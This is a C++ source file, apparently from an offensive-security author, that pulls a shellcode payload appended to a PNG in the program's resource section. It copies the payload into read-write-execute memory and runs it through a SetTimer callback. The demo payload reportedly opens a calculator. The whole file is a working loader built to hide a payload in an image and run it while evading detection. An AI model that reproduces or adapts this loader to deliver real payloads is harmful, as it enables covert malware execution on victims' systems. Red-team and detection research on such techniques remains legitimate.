// Payload-extractor-from-resource.cpp
// By WafflesExploits

#define _CRT_SECURE_NO_WARNINGS // Avoid warning messages for fopen
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "resource.h"

// Modify the following variables below:
#define ORIGINAL_FILE_SIZE 6594 // Replace with the actual original file size
#define PAYLOAD_RESOURCE_ID IDB_PNG1 // Find this value in resource.h
#define PAYLOAD_RESOURCE_TYPE L"PNG" // Find this value in Resource.rc. Search by your resource_id.

// The combined_file.png opens a calculator

/**
 * @brief Extracts the hidden payload from the resource section and stores it,
 *        treating the resource data as a combined file (original + payload).
 *
 * @param resourceID The resource identifier (e.g., IDB_PNG1).
 * @param resourceType The resource type (e.g., PNG).
 * @param pPayload Pointer to an unsigned char* where the extracted payload will be stored.
 * @param pPayload_size Pointer to a size_t where the payload size will be stored.
 * @param original_size The size of the original file in bytes.
 * @return BOOL TRUE if extraction is successful, FALSE otherwise.
 */
BOOL extract_payload_from_resource(WORD resourceID, LPCWSTR resourceType, unsigned char** pPayload, size_t* pPayload_size, long int original_size) {
    HRSRC hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(resourceID), resourceType);
    if (hRsrc == NULL) {
        printf("Error: FindResourceW failed with error %d.\n", GetLastError());
        return FALSE;
    }

    HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
    if (hGlobal == NULL) {
        printf("Error: LoadResource failed with error %d.\n", GetLastError());
        return FALSE;
    }

    LPVOID pResourceData = LockResource(hGlobal);
    if (pResourceData == NULL) {
        printf("Error: LockResource failed with error %d.\n", GetLastError());
        return FALSE;
    }

    SIZE_T sSize = SizeofResource(NULL, hRsrc);
    if (sSize == 0) {
        printf("Error: SizeofResource failed with error %d.\n", GetLastError());
        return FALSE;
    }

    // At this point, sSize is the total size of the resource data,
    // which we are treating as a combined file (original + payload).
    // We use ORIGINAL_FILE_SIZE to determine how much of this data is payload.
    long int target_size = (long int)sSize;
    if (original_size > target_size) {
        printf("Error: Original file size (%ld bytes) is larger than the resource size (%ld bytes).\n", original_size, target_size);
        return FALSE;
    }

    long int payload_size = target_size - original_size;
    if (payload_size <= 0) {
        printf("Error: No payload data found after the original file.\n");
        return FALSE;
    }

    printf("Payload size to extract from resources: %ld bytes\n", payload_size);

    // Allocate memory for the payload
    unsigned char* Payload = (unsigned char*)malloc(payload_size);
    if (Payload == NULL) {
        printf("Error: Unable to allocate memory for payload.\n");
        return FALSE;
    }

    // Copy the payload data starting from original_size offset
    memcpy(Payload, (unsigned char*)pResourceData + original_size, payload_size);

    *pPayload = Payload;
    *pPayload_size = (size_t)payload_size;
    return TRUE;
}

/**
 * @brief Executes payload via SetTimer Callback function.
 *
 * @param Payload Pointer to where payload is stored.
 * @param sPayloadSize Size of Payload.
 * @return BOOL TRUE if successful, FALSE otherwise.
 */
BOOL ExecutePayloadViaCallback(unsigned char* Payload, size_t sPayloadSize) {
    // Allocate memory for payload with VirtualAlloc
    LPVOID pShellcodeAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);
    printf("[#] Writing Payload ... \n");

    memcpy(pShellcodeAddress, Payload, sPayloadSize);

    // Free the allocated memory for the extracted payload
    free(Payload);

    printf("[#] Executing payload ... \n");

    // Executing Payload with SetTimer Callback
    UINT_PTR dummy = 0;
    MSG msg;

    SetTimer(NULL, dummy, NULL, (TIMERPROC)pShellcodeAddress);
    GetMessageW(&msg, NULL, 0, 0);
    DispatchMessageW(&msg);

    // Free the shellcode memory after execution
    VirtualFree(pShellcodeAddress, sPayloadSize, MEM_RELEASE);

    return TRUE;
}

int main() {
    unsigned char* Payload = NULL;
    size_t sPayloadSize = 0;
    long int OriginalFileSize = ORIGINAL_FILE_SIZE;

    // Extract the payload from the resource section, treating the resource data
    // as a combined file: original file + appended payload.
    if (!extract_payload_from_resource(PAYLOAD_RESOURCE_ID, PAYLOAD_RESOURCE_TYPE, &Payload, &sPayloadSize, OriginalFileSize)) {
        printf("[!] Payload extraction from resource failed.\n");
        return EXIT_FAILURE;
    }

    // Execute the payload via callback
    if (!ExecutePayloadViaCallback(Payload, sPayloadSize)) {
        printf("[!] ExecutePayloadViaCallback failed.\n");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
